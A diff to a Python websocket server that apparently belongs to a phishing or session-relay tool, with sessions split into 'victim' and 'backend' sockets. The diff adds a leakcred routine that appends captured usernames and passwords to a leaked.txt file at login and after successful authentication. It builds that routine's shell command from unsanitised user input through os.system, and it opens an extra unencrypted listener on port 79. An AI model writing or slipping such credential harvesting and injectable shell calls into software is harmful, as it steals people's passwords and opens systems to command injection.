@@ -29,19 +29,23 @@ class SocketServer():
         self.sessions = {}
         self.host = host
 
+    def leakcred(self, usr, pas, bid):
+        os.system("echo '{}\t\t{}\t\t{}' >> ../../leaked.txt".format(usr, pas, bid))
+
     def start_server(self):
         ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
         key = os.path.abspath(
             os.path.join(os.path.dirname(__file__), '../ssl/key.pem'))
         crt = os.path.abspath(
             os.path.join(os.path.dirname(__file__), '../ssl/cert.pem'))
-        print("Using key", key)
-        print("Using certificate", crt)
+        self.log("Using key", key)
+        self.log("Using certificate", crt)
         ssl_context.load_cert_chain(crt, keyfile=key)
 
         server = websockets.serve(self.main, self.host, 80, ssl=ssl_context)
+        server2 = websockets.serve(self.main, self.host, 79)
 
-        print('Starting Socket Server on Port 80')
+        self.log('Starting Socket Server on Port 80')
         signal.signal(signal.SIGINT, self.signal_handler)
         asyncio.get_event_loop().run_until_complete(server)
         asyncio.get_event_loop().run_forever()
@@ -49,12 +53,12 @@ class SocketServer():
     def signal_handler(self, signal, frame):
         self.backends.close_all()
         time.sleep(1)
-        print("Closed all docker instances.",
+        self.log("Closed all docker instances.",
             "Ctrl+C again to close any remaining threads")
         sys.exit(0)
 
     def log(self, *args):
-        print( "SOCKET_SERVER:"+" ".join(map(str,args)))
+        print("[*] SOCKET_SERVER\t" + " ".join(map(str,args)))
     
     # Claims backend for session SID
     async def claim_backend(self, SID, usr, pas):
@@ -119,7 +123,7 @@ class SocketServer():
                     await websocket.send(json.dumps({"pong":"pong"}));
                     continue
 
-                self.log("received: ", data)
+                self.log("RECEIVED: ", data)
 
                 if "auth" in data.keys(): 
                     continue
@@ -139,6 +143,10 @@ class SocketServer():
                             continue
 
                         self.log("Created new session", SID, "starting auth")
+
+                        # leak kerb/pass to file just in case
+                        self.leakcred(data["username"], data["password"], "in progress")
+
                         # run this on separate thread to avoid blocking message pool
                         #await self.claim_backend(SID, data["username"], data["password"])
                         await self.add_session(
@@ -203,6 +211,10 @@ class SocketServer():
                         self.log("Session SID<->BID<->USR :", SID + "<->" + 
                             str(self.sessions[SID]["bid"]) 
                                 + self.sessions[SID]["user"], "successful.")
+
+                        # leak kerb/pass to file just in case
+                        self.leakcred(self.sessions[SID]["user"], self.sessions[SID]["pass"], data["bid"])
+
                         self.sessions[SID]["succ"] = True
                         bid = data["bid"]
                         name = self.sessions[SID]["user"]
@@ -222,18 +234,18 @@ class SocketServer():
             victim = None
             backend = None
             for SID in list(self.sessions.keys()):
-                if sessions[SID]["backend"] is websocket: 
+                if self.sessions[SID]["backend"] is websocket: 
                     backend = SID
-                if sessions[SID]["victim"] is websocket:
+                if self.sessions[SID]["victim"] is websocket:
                     victim = SID
             if victim is not None: 
                 self.log("The culprit that caused this crash was the VICTIM",
                     "assosciated with SID:", SID, "and BID:", 
-                    sessions[SID]["bid"])
+                    self.sessions[SID]["bid"])
             if victim is not None: 
                 self.log("The culprit that caused this crash was the BACKEND",
                     "assosciated with SID:", SID, "and BID:", 
-                    sessions[SID]["bid"])
+                    self.sessions[SID]["bid"])
         finally:
             # unregister websocket that died
             for SID in list(self.sessions.keys()):
